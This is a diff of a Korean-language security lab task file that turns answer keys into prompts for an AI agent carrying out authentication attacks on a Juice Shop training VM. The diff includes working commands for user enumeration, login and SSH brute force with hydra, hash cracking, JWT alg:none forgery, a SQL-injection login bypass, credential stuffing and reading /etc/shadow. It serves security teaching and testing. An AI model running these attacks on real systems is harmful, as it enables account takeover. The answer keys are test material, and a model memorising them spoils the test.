@@ -18,9 +18,12 @@ steps:
   hint: curl로 API를 호출하고 python3으로 이메일만 추출한다
   category: recon
   points: 10
-  answer: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
-    [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt &&
-    cat /tmp/users.txt
+  answer: '🤖 프롬프트: JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을
+    만들어라해줘
+
+    📎 참고 (CLI): curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json;
+    [print(u[''email'']) for u in json.load(sys.stdin)[''data'']]" > /tmp/users.txt
+    && cat /tmp/users.txt'
   answer_detail: 공격 대상 사용자 목록을 확보하는 것은 인증 공격의 첫 단계이다. API에서 사용자 정보가 노출되면 유효한 이메일/사용자명을
     수집하여 브루트포스 공격의 효율을 높일 수 있다.
   verify:
@@ -39,7 +42,10 @@ steps:
   hint: for 루프와 curl을 조합하여 여러 비밀번호를 시도한다
   category: exploit
   points: 10
-  answer: 'for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
+  answer: '🤖 프롬프트: JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
+    계정을 대상으로 해줘
+
+    📎 참고 (CLI): for pw in admin admin123 password 12345 admin1234; do echo -n "Trying:
     $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
     application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
     | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication''
@@ -65,8 +71,10 @@ steps:
   hint: hydra -l 사용자 -P 사전파일 ssh://타겟 형태로 실행한다
   category: exploit
   points: 10
-  answer: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
-    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
+  answer: '🤖 프롬프트: hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘
+
+    📎 참고 (CLI): head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null;
+    hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f'
   answer_detail: hydra는 다양한 프로토콜(SSH, HTTP, FTP, SMB 등)에 대한 온라인 브루트포스 도구이다. -t 옵션으로
     동시 스레드 수를 제어하고, -f 옵션으로 첫 성공 시 중단한다. SSH는 기본적으로 rate limiting이 있어 느리다.
   verify:
@@ -84,9 +92,11 @@ steps:
   hint: 해시를 파일에 저장하고 john --format=raw-md5로 크래킹한다
   category: exploit
   points: 10
-  answer: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5
-    --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>/dev/null; john --format=raw-md5
-    --show /tmp/hash.txt
+  answer: '🤖 프롬프트: John the Ripper를 사용하여 MD5 해시를 크래킹해줘
+
+    📎 참고 (CLI): echo -n ''admin123'' | md5sum | awk ''{print $1}'' > /tmp/hash.txt
+    && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
+    2>/dev/null; john --format=raw-md5 --show /tmp/hash.txt'
   answer_detail: 오프라인 비밀번호 크래킹은 해시 값을 확보한 후 원문을 복원하는 기법이다. MD5는 더 이상 안전하지 않은 해시 알고리즘으로,
     rainbow table이나 사전 공격으로 빠르게 크래킹된다.
   verify:
@@ -105,8 +115,11 @@ steps:
   hint: 보안 질문의 답변을 추측하여 비밀번호를 재설정한다
   category: exploit
   points: 10
-  answer: 'for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo -n
-    "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
+  answer: '🤖 프롬프트: JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변
+    브루트포스를 시도하라. admin@juice-sh.op 계정을 대상으로 해줘
+
+    📎 참고 (CLI): for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo
+    -n "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password
     -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}"
     | head -c 100; echo; done'
   answer_detail: 보안 질문 기반 비밀번호 재설정은 추측 가능한 답변으로 인해 취약하다. OSINT로 수집한 정보(SNS, 블로그 등)를
@@ -128,9 +141,11 @@ steps:
   hint: JWT header의 alg를 none으로 변경하고 signature 부분을 제거한다
   category: exploit
   points: 15
-  answer: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode();
-    p=base64.urlsafe_b64encode(json.dumps({'status':'success','data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'iat':1700000000}).encode()).rstrip(b'=').decode();
-    print(f'{h}.{p}.')"
+  answer: '🤖 프롬프트: JWT 토큰의 알고리즘을 ''none''으로 변경하여 서명 검증을 우회하라. python3으로 조작된 JWT를 생성해줘
+
+    📎 참고 (CLI): python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({''typ'':''JWT'',''alg'':''none''}).encode()).rstrip(b''='').decode();
+    p=base64.urlsafe_b64encode(json.dumps({''status'':''success'',''data'':{''id'':1,''email'':''admin@juice-sh.op'',''role'':''admin''},''iat'':1700000000}).encode()).rstrip(b''='').decode();
+    print(f''{h}.{p}.'')"'
   answer_detail: JWT의 'none' 알고리즘 공격은 서버가 알고리즘 필드를 클라이언트에서 받아들일 때 가능하다. alg:none으로
     설정하면 서명 검증이 생략되어 페이로드를 자유롭게 조작할 수 있다. 현대 JWT 라이브러리는 이를 차단한다.
   verify:
@@ -149,7 +164,10 @@ steps:
   hint: hashcat -m 1400 옵션이 raw SHA-256이다
   category: exploit
   points: 10
-  answer: 'echo -n ''password'' | sha256sum | awk ''{print $1}'' > /tmp/sha256.txt
+  answer: '🤖 프롬프트: hashcat을 사용하여 SHA-256 해시를 크래킹하라. echo -n ''password'' | sha256sum으로
+    해시를 생성하고 복원해줘
+
+    📎 참고 (CLI): echo -n ''password'' | sha256sum | awk ''{print $1}'' > /tmp/sha256.txt
     && hashcat -m 1400 /tmp/sha256.txt /usr/share/wordlists/rockyou.txt --force 2>/dev/null
     | tail -5; echo ''Hash: ''$(cat /tmp/sha256.txt)'
   answer_detail: hashcat은 GPU 가속을 지원하는 고성능 해시 크래킹 도구이다. -m 옵션으로 해시 타입을 지정한다(0=MD5,
@@ -171,9 +189,12 @@ steps:
   hint: '일반적인 JWT 비밀 키 후보: secret, 1234, password 등을 시도한다'
   category: exploit
   points: 10
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+  answer: '🤖 프롬프트: JuiceShop에 새 사용자를 등록하고, 로그인하여 받은 JWT 토큰에서 비밀 키(secret)를 추측하라. jwt
+    크래킹 도구나 수동 방법을 사용해줘
+
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
+    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
+    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && python3 -c "import hmac,hashlib,base64,sys; t=''$TOKEN''; parts=t.split(''.'');
     header_payload=parts[0]+''.''+parts[1]; sig=parts[2]; secrets=[''secret'',''1234'',''password'',''jwt_secret'',''key''];
     [print(f''Key: {s} -> Match: {base64.urlsafe_b64encode(hmac.new(s.encode(),header_payload.encode(),hashlib.sha256).digest()).rstrip(b"=").decode()==sig}'')
@@ -200,8 +221,11 @@ steps:
   hint: ssh-keygen -t ed25519 옵션을 사용한다
   category: analysis
   points: 10
-  answer: ssh-keygen -t ed25519 -f /tmp/test_key -N '' -q && echo 'Public Key:' &&
-    cat /tmp/test_key.pub && echo 'Key fingerprint:' && ssh-keygen -lf /tmp/test_key
+  answer: '🤖 프롬프트: SSH 키 기반 인증의 보안 이점을 확인하기 위해, ssh-keygen으로 ED25519 키 쌍을 생성해줘
+
+    📎 참고 (CLI): ssh-keygen -t ed25519 -f /tmp/test_key -N '''' -q && echo ''Public
+    Key:'' && cat /tmp/test_key.pub && echo ''Key fingerprint:'' && ssh-keygen -lf
+    /tmp/test_key'
   answer_detail: SSH 키 기반 인증은 비밀번호 브루트포스에 면역이다. ED25519는 256비트 타원곡선 기반으로 RSA보다 짧은
     키 길이에서 동등한 보안 강도를 제공한다.
   verify:
@@ -220,7 +244,9 @@ steps:
   hint: 사용자:비밀번호 형태의 파일을 만들고 while read 루프로 시도한다
   category: exploit
   points: 10
-  answer: 'echo -e ''admin@juice-sh.op:admin123\njim@juice-sh.op:ncc-1701\nbender@juice-sh.op:bender\nmc.safesearch@juice-sh.op:Mr.
+  answer: '🤖 프롬프트: 크리덴셜 스터핑을 시뮬레이션해줘
+
+    📎 참고 (CLI): echo -e ''admin@juice-sh.op:admin123\njim@juice-sh.op:ncc-1701\nbender@juice-sh.op:bender\nmc.safesearch@juice-sh.op:Mr.
     N00dles'' > /tmp/creds.txt && while IFS=: read -r email pw; do echo -n "$email
     -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
     application/json'' -d "{\"email\":\"$email\",\"password\":\"$pw\"}" | python3
@@ -246,7 +272,9 @@ steps:
   hint: sudo cat /etc/shadow로 해시를 확인하고 $id$ 형식을 분석한다
   category: analysis
   points: 10
-  answer: 'sudo cat /etc/shadow | grep -v ''!'' | grep -v ''*'' | head -5 | while
+  answer: '🤖 프롬프트: /etc/shadow 파일의 해시 형식을 분석해줘
+
+    📎 참고 (CLI): sudo cat /etc/shadow | grep -v ''!'' | grep -v ''*'' | head -5 | while
     read line; do user=$(echo $line | cut -d: -f1); hash=$(echo $line | cut -d: -f2);
     algo=$(echo $hash | cut -d''$'' -f2); echo "User: $user, Algorithm: $algo"; done'
   answer_detail: '/etc/shadow의 해시 형식은 $id$salt$hash이다. id 값으로 알고리즘을 식별한다: 1=MD5, 5=SHA-256,
@@ -267,8 +295,11 @@ steps:
   hint: NTLM 해시는 MD4(UTF-16LE(password))이다
   category: analysis
   points: 10
-  answer: python3 -c "import hashlib; print('NTLM hash of password:', hashlib.new('md4',
-    'password'.encode('utf-16-le')).hexdigest())"
+  answer: '🤖 프롬프트: pass-the-hash 개념을 이해하기 위해 NTLM 해시를 생성하라. python3으로 ''password''의
+    NTLM 해시를 계산해줘
+
+    📎 참고 (CLI): python3 -c "import hashlib; print(''NTLM hash of password:'', hashlib.new(''md4'',
+    ''password''.encode(''utf-16-le'')).hexdigest())"'
   answer_detail: NTLM 해시는 Windows 인증에 사용되며, MD4(UTF-16LE(password))로 계산된다. Pass-the-Hash
     공격은 원문 비밀번호 없이 해시 값만으로 인증하는 기법으로, Windows 도메인 환경에서 위험하다.
   verify:
@@ -286,8 +317,10 @@ steps:
   hint: /api/SecurityAnswers 또는 /rest/user/security-question 엔드포인트를 사용한다
   category: recon
   points: 10
-  answer: curl -s 'http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op'
-    | python3 -m json.tool
+  answer: '🤖 프롬프트: JuiceShop의 Forgot Password 기능에서 admin@juice-sh.op의 보안 질문을 확인해줘
+
+    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op''
+    | python3 -m json.tool'
   answer_detail: 보안 질문이 API로 노출되면 답변을 추측하기 위한 정보를 제공한다. 좋은 보안 질문은 추측이 어렵고, 시간이 지나도
     답변이 변하지 않으며, 다양한 가능성이 있어야 한다.
   verify:
@@ -305,10 +338,11 @@ steps:
   hint: for 루프로 10회 반복하고 응답 상태를 확인한다
   category: analysis
   points: 10
-  answer: "for i in $(seq 1 10); do STATUS=$(curl -s -o /dev/null -w '%{http_code}'\
-    \ \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type:\
-    \ application/json' \\\n     -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
-    :\"wrong'$i'\"}'); echo \"Attempt $i: HTTP $STATUS\"; done"
+  answer: "\U0001F916 프롬프트: rate limiting 부재를 확인하라. JuiceShop 로그인 API에 10회 연속 잘못된\
+    \ 비밀번호로 로그인을 시도하고 계정이 잠기는지 확인해줘\n\U0001F4CE 참고 (CLI): for i in $(seq 1 10); do\
+    \ STATUS=$(curl -s -o /dev/null -w '%{http_code}' \\\n     -X POST http://10.20.30.80:3000/rest/user/login\
+    \ \\\n     -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"admin@juice-sh.op\"\
+    ,\"password\":\"wrong'$i'\"}'); echo \"Attempt $i: HTTP $STATUS\"; done"
   answer_detail: 계정 잠금이나 rate limiting이 없으면 브루트포스 공격에 무방비 상태이다. 모든 시도에 같은 HTTP 상태(401)가
     반환되면 방어 메커니즘이 없는 것이다. OWASP는 5~10회 실패 후 계정 잠금을 권장한다.
   verify:
@@ -329,7 +363,9 @@ steps:
   hint: 발견된 모든 인증 취약점을 정리한다
   category: analysis
   points: 15
-  answer: 'echo -e ''=== Authentication Attack Report ===\n\n[Compromised Accounts]\n-
+  answer: '🤖 프롬프트: 인증 공격 결과를 정리하여 /tmp/auth_attack_report 구현 방법과 예시를 설명해줘
+
+    📎 참고 (CLI): echo -e ''=== Authentication Attack Report ===\n\n[Compromised Accounts]\n-
     admin@juice-sh.op: SQL Injection bypass\n- Multiple accounts: credential stuffing\n\n[Vulnerabilities]\n1.
     No rate limiting on login API\n2. Weak password policy\n3. Security question answers
     guessable\n4. JWT secret key weakness\n5. User enumeration via API\n\n[Recommendations]\n1.
@@ -378,7 +414,19 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) JuiceShop의 사용자 목록 API(/api/Users)에서 이메일 주소를 수집하여 공격 대상 사용자 목록을 만들어라해줘
+
+    2) JuiceShop 로그인 API에 대해 일반적인 비밀번호 목록을 사용하여 수동 브루트포스를 시도하라. admin@juice-sh.op
+    계정을 대상으로 해줘
+
+    3) hydra를 사용하여 SSH 서비스(10.20.30.80:22)에 대한 비밀번호 브루트포스를 시도해줘
+
+    4) John the Ripper를 사용하여 MD5 해시를 크래킹해줘
+
+    5) JuiceShop의 비밀번호 재설정 기능(/rest/user/reset-password)을 사용하여 보안 질문 답변 브루트포스를 시도하라.
+    admin@juice-sh.op 계정을 대상으로 해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
